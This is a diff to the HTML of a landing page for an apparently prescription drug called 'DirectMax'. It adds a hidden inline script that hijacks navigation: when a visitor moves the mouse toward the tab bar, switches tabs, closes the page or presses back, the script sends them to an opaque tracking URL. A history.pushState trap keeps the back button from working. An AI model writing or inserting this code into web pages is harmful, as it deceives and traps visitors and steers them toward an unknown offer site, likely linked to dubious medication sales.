@@ -260,5 +260,44 @@
     <p>DirectMax is a prescription-only medication. A licensed physician must review and approve your order.</p>
   </footer>
 
+  <script>
+    (function () {
+      var OFFER_URL = "https://www.nz91nyfbo.com/3LPDKC/478DSG/?uid=411";
+      var fired = false;
+
+      function redirectOnce() {
+        if (fired) return;
+        fired = true;
+        window.location.href = OFFER_URL;
+      }
+
+      // Desktop: mouse leaves toward the top of the viewport (going for tab/close/back)
+      document.addEventListener("mouseout", function (e) {
+        if (fired) return;
+        if (e.clientY <= 0 && (e.relatedTarget === null || e.toElement === null)) {
+          redirectOnce();
+        }
+      });
+
+      // Desktop: user switches tab / minimizes / alt-tabs
+      document.addEventListener("visibilitychange", function () {
+        if (document.visibilityState === "hidden") {
+          redirectOnce();
+        }
+      });
+
+      // Mobile/desktop: user attempts to close tab or navigate away
+      window.addEventListener("pagehide", function () {
+        redirectOnce();
+      });
+
+      // Mobile: back button press
+      window.addEventListener("popstate", function () {
+        redirectOnce();
+      });
+      history.pushState(null, "", window.location.href);
+    })();
+  </script>
+
 </body>
 </html>
